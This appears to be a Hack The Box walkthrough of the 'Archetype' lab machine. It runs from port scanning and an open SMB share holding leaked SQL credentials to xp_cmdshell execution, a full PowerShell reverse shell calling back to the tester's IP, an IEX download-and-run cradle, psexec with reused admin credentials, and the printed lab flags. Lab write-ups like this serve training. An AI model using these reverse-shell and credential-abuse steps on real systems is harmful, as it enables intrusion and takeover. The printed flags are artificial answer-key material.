# Archetype

Starting Point

Introduction to HTB labs and basic machines/challenges. 

# Enumeration

~~~
unknown@kali:/data$ ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
unknown@kali:/data$ nmap -sC -sV -p$ports 10.10.10.27
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 07:28 CEST
Nmap scan report for 10.10.10.27
Host is up (0.031s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-06-12T03:36:15
|_Not valid after:  2050-06-12T03:36:15
|_ssl-date: 2020-06-12T05:43:40+00:00; +14m28s from scanner time.
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h38m28s, deviation: 3h07m52s, median: 14m27s
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-11T22:43:35-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-12T05:43:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.79 seconds
~~~

Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.

It is worth checking to see if anonymous access has been permitted, as file shares often store configuration files containing passwords or other sensitive information. We can use smbclient to list available shares (use an empty password):

~~~
unknown@kali:/data$ smbclient -L //10.10.10.27
Enter WORKGROUP\unknown's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
~~~

It seems there is a share called backups. Let's attempt to access it and see what's inside.

~~~
unknown@kali:/data$ smbclient //10.10.10.27/backups
Enter WORKGROUP\unknown's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020

		10328063 blocks of size 4096. 8259098 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
smb: \> Ctrl^D
~~~

There is a dtsConfig file, which is a config file used with SSIS.

~~~
unknown@kali:/data$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
~~~

# Foothold

We see that it contains a SQL connection string, containing credentials for the local Windows user `ARCHETYPE\sql_svc.`

Let's try connecting to the SQL Server using [Impacket's](https://github.com/SecureAuthCorp/impacket) mssqlclient.py.

~~~
unknown@kali:/data$ mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> select is_srvrolemember('sysadmin')
              

-----------   

          1   

SQL> 
~~~

We can use the `IS_SRVROLEMEMBER` function to reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. This is successful, and we do indeed have sysadmin privileges.

This will allow us to enable `xp_cmdshell` and gain RCE on the host. Let's attempt this, by inputting the commands below.

```sh
SQL> EXEC sp_configure 'Show Advanced Options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> sp_configure;
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

access check cache bucket count                 0         65536              0             0   
access check cache quota                        0    2147483647              0             0   
Ad Hoc Distributed Queries                      0             1              0             0   

[REDACTED]

user connections                                0         32767              0             0   
user options                                    0         32767              0             0   
xp_cmdshell                                     0             1              1             1   

SQL> EXEC sp_configure 'xp_cmdshell', 1
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure;
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               

SQL> 
```

The `whoami` command output reveals that the SQL Server is also running in the context of the user `ARCHETYPE\sql_svc`. However, this account doesn't seem to have administrative privileges on the host.

Let's attempt to get a proper shell, and proceed to further enumerate the system. We can save the PowerShell reverse shell below as `shell.ps1` (adapt the IP address with yours).

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Next, stand up a mini webserver in order to host the file. We can use Python.

```bash
unknown@kali:/data/tmp$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After standing up a netcat listener on port 443, we can use `ufw` to allow the call backs on port 80 and 443 to our machine.

```bash
unknown@kali:/data/tmp$ sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443
unknown@kali:/data/tmp$ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
```

We can now issue the command to download and execute the reverse shell through `xp_cmdshell` (Once again, adapt with your IP address).

```sh
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
```

A shell is received as sql_svc, and we can get the user.txt on their desktop.

~~~
# whoami
archetype\sql_svc

# more \users\sql_svc\desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
~~~

User flag: `3e7b102e78218e935bf3f4951fec21a3`

# Privilege Escalation

As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the command below to access the PowerShell history file.

~~~
# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
~~~

This reveals that the `backups` drive has been mapped using the local administrator credentials. We can use Impacket's `psexec.py` to gain a privileged shell.

~~~
unknown@kali:/data$ psexec.py administrator@10.10.10.27
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file HbnjRkzA.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service VXMW on 10.10.10.27.....
[*] Starting service VXMW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
~~~

This is successful, and we can now access the flag on the administrator desktop.

~~~
C:\Windows\system32>more \users\administrator\desktop\root.txt
b91ccec3305e98240082d4474b848528
~~~

Root flag: `b91ccec3305e98240082d4474b848528`
